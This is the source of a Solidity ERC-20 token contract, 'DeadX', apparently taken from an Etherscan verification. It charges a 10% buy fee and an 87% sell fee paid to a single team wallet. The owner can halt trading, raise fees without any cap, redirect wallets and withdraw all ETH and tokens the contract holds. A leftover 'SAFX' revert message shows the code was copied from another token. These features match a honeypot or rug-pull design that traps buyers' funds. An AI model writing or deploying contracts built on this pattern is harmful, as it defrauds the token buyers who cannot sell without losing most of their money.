/**
 *Submitted for verification at Etherscan.io on 2022-11-16
*/

/**


DeadX


*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function transferOwnership(address payable _ownerNew) external onlyOwner {
        owner = _ownerNew;
        emit OwnershipTransferred(_ownerNew);
    }
    event OwnershipTransferred(address _ownerNew);
}

interface IRouter {
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DEADX is IERC20, Ownable {
    string public constant _name = "DeadX";
    string public constant _symbol = "DEADX";
    uint8 public constant _decimals = 9;

    uint256 public constant _totalSupply = 1_000_000_000 * (10 ** _decimals);

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) public _allowances;

    mapping (address => bool) public noTax;
    mapping (address => bool) public noMax;
    mapping (address => bool) public dexPair;

    uint256 public buyFeeTeam = 1000;
    uint256 public buyFeeInsurance = 0;
    uint256 public buyFeeLiqExchange = 0;
    uint256 public buyFeeLiqToken = 0;
    uint256 public buyFee = 1000;
    uint256 public sellFeeTeam = 8700;
    uint256 public sellFeeInsurance = 0;
    uint256 public sellFeeLiqExchange = 0;
    uint256 public sellFeeLiqToken = 0;
    uint256 public sellFee = 8700;

    uint256 private _tokensTeam = 0;
    uint256 private _tokensInsurance = 0;
    uint256 private _tokensLiqExchange = 0;
    uint256 private _tokensLiqToken = 0;

    address public walletTeam = 0xDEAD06eeA707179dfD996cA289F71D252Cd1759f;
    address public walletInsurance = 0xDEAD06eeA707179dfD996cA289F71D252Cd1759f;
    address public walletLiqExchange = 0xDEAD06eeA707179dfD996cA289F71D252Cd1759f;
    address public walletLiqToken = 0xDEAD06eeA707179dfD996cA289F71D252Cd1759f;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IRouter public router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public pair;

    uint256 public maxWallet = 20_000_000 * (10 ** _decimals);
    uint256 public swapTrigger = 0;
    uint256 public swapThreshold = 25_000 * (10 ** _decimals);

    bool public tradingLive = false;

    bool private _swapping;

    modifier swapping() {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () Ownable(msg.sender) {
        pair = IFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = _totalSupply;

        noTax[msg.sender] = true;
        noMax[msg.sender] = true;

        dexPair[pair] = true;

        approve(address(router), _totalSupply);
        approve(address(pair), _totalSupply);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            require(_allowances[sender][msg.sender] >= amount, "Insufficient allowance");
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {
        if (_swapping) return _basicTransfer(sender, recipient, amount);
        require(tradingLive || sender == owner, "Trading not live");

        address routerAddress = address(router);
        bool _sell = dexPair[recipient] || recipient == routerAddress;

        if (!_sell && !noMax[recipient]) require((_balances[recipient] + amount) < maxWallet, "Max wallet triggered");

        if (_sell && amount >= swapTrigger) {
            if (!dexPair[msg.sender] && !_swapping && _balances[address(this)] >= swapThreshold) _sellTaxedTokens();
        }

        require(_balances[sender] >= amount, "Insufficient balance");
        _balances[sender] = _balances[sender] - amount;

        uint256 amountReceived = (((dexPair[sender] || sender == address(router)) || (dexPair[recipient]|| recipient == address(router))) ? !noTax[sender] && !noTax[recipient] : false) ? _collectTaxedTokens(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(_balances[sender] >= amount, "Insufficient balance");
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        return true;
    }

    function _collectTaxedTokens(address sender, address receiver, uint256 amount) private returns (uint256) {
        bool _sell = dexPair[receiver] || receiver == address(router);
        uint256 _fee = _sell ? sellFee : buyFee;
        uint256 _tax = amount * _fee / 10000;

        if (_fee > 0) {
            if (_sell) {
                if (sellFeeTeam > 0) _tokensTeam += _tax * sellFeeTeam / _fee;
                if (sellFeeInsurance > 0) _tokensInsurance += _tax * sellFeeInsurance / _fee;
                if (sellFeeLiqExchange > 0) _tokensLiqExchange += _tax * sellFeeLiqExchange / _fee;
                if (sellFeeLiqToken > 0) _tokensLiqToken += _tax * sellFeeLiqToken / _fee;
            } else {
                if (buyFeeTeam > 0) _tokensTeam += _tax * buyFeeTeam / _fee;
                if (buyFeeInsurance > 0) _tokensInsurance += _tax * buyFeeInsurance / _fee;
                if (buyFeeLiqExchange > 0) _tokensLiqExchange += _tax * buyFeeLiqExchange / _fee;
                if (buyFeeLiqToken > 0) _tokensLiqToken += _tax * buyFeeLiqToken / _fee;
            }
        }

        _balances[address(this)] = _balances[address(this)] + _tax;
        emit Transfer(sender, address(this), _tax);

        return amount - _tax;
    }

    function _sellTaxedTokens() private swapping {
        uint256 _tokens = _tokensTeam + _tokensInsurance + _tokensLiqExchange + _tokensLiqToken;

        uint256 _liquidityTokensToSwapHalf = _tokensLiqToken / 2;
        uint256 _swapInput = balanceOf(address(this)) - _liquidityTokensToSwapHalf;

        uint256 _balanceSnapshot = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_swapInput, 0, path, address(this), block.timestamp);

        uint256 _tax = address(this).balance - _balanceSnapshot;

        uint256 _taxTeam = _tax * _tokensTeam / _tokens / 2;
        uint256 _taxInsurance = _tax * _tokensInsurance / _tokens;
        uint256 _taxLiqExchange = _tax * _tokensLiqExchange / _tokens;
        uint256 _taxLiqToken = _tax * _tokensLiqToken / _tokens;

        _tokensTeam = 0;
        _tokensInsurance = 0;
        _tokensLiqExchange = 0;
        _tokensLiqToken = 0;

        if (_taxTeam > 0) payable(walletTeam).call{value: _taxTeam}("");
        if (_taxInsurance > 0) payable(walletInsurance).call{value: _taxInsurance}("");
        if (_taxLiqExchange > 0) payable(walletLiqExchange).call{value: _taxLiqExchange}("");
        if (_taxLiqToken > 0) router.addLiquidityETH{value: _taxLiqToken}(address(this), _liquidityTokensToSwapHalf, 0, 0, walletLiqToken, block.timestamp);
    }

    function changeDexPair(address _pair, bool _value) external onlyOwner {
        dexPair[_pair] = _value;
    }

    function fetchDexPair(address _pair) external view returns (bool) {
        return dexPair[_pair];
    }

    function changeNoTax(address _wallet, bool _value) external onlyOwner {
        noTax[_wallet] = _value;
    }

    function fetchNoTax(address _wallet) external view returns (bool) {
        return noTax[_wallet];
    }

    function changeNoMax(address _wallet, bool _value) external onlyOwner {
        noMax[_wallet] = _value;
    }

    function fetchNoMax(address _wallet) external view onlyOwner returns (bool) {
        return noMax[_wallet];
    }

    function changeMaxWallet(uint256 _maxWallet) external onlyOwner {
        maxWallet = _maxWallet;
    }

    function changeFees(uint256 _buyFeeTeam, uint256 _buyFeeInsurance, uint256 _buyFeeLiqExchange, uint256 _buyFeeLiqToken, uint256 _sellFeeTeam, uint256 _sellFeeInsurance, uint256 _sellFeeLiqExchange, uint256 _sellFeeLiqToken) external onlyOwner {
        buyFeeTeam = _buyFeeTeam;
        buyFeeInsurance = _buyFeeInsurance;
        buyFeeLiqExchange = _buyFeeLiqExchange;
        buyFeeLiqToken = _buyFeeLiqToken;
        buyFee = _buyFeeTeam + _buyFeeInsurance + _buyFeeLiqExchange + _buyFeeLiqToken;
        sellFeeTeam = _sellFeeTeam;
        sellFeeInsurance = _sellFeeInsurance;
        sellFeeLiqExchange = _sellFeeLiqExchange;
        sellFeeLiqToken = _sellFeeLiqToken;
        sellFee = _sellFeeTeam + _sellFeeInsurance + _sellFeeLiqExchange + _sellFeeLiqToken;
    }

    function changeWallets(address _walletTeam, address _walletInsurance, address _walletLiqExchange, address _walletLiqToken) external onlyOwner {
        walletTeam = _walletTeam;
        walletInsurance = _walletInsurance;
        walletLiqExchange = _walletLiqExchange;
        walletLiqToken = _walletLiqToken;
    }

    function enableTrading() external onlyOwner {
        tradingLive = true;
    }

    function changeSwapSettings(uint256 _swapTrigger, uint256 _swapThreshold) external onlyOwner {
        swapTrigger = _swapTrigger;
        swapThreshold = _swapThreshold;
    }

    function getCirculatingSupply() external view returns (uint256) {
        return _totalSupply - balanceOf(0x000000000000000000000000000000000000dEaD) - balanceOf(0x0000000000000000000000000000000000000000);
    }

    function transferETH() external onlyOwner {
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function transferERC(address _erc20Address) external onlyOwner {
        require(_erc20Address != address(this), "Can't withdraw SAFX");
        IERC20 _erc20 = IERC20(_erc20Address);
        _erc20.transfer(msg.sender, _erc20.balanceOf(address(this)));
    }
}